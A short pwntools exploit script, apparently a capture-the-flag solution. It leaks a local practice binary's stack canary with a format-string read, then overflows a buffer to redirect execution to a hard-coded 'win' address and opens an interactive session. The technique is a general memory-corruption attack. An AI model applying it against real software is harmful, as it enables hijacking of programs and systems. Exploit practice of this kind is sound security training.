from pwn import *


WIN_ADDR = 0x1000004b8
CANARY_INDEX = 20  # %20$lx


p = process(["./aslrbp", "./1"])
p.recvuntil(b"Input: \n")
fmt = f"%{CANARY_INDEX}$lx".encode()
p.sendline(fmt)
data = p.recvuntil(b"Input2: \n")
body = data[:-len(b"Input2: \n")]
tokens = body.split()
leak_hex = tokens[-1]
canary = int(leak_hex, 16)
log.info(f"Leaked canary: {hex(canary)}")

payload = b"A" * 0x80 + p64(canary) + b"B" * 8 + p64(WIN_ADDR)
p.sendline(payload)

p.interactive()

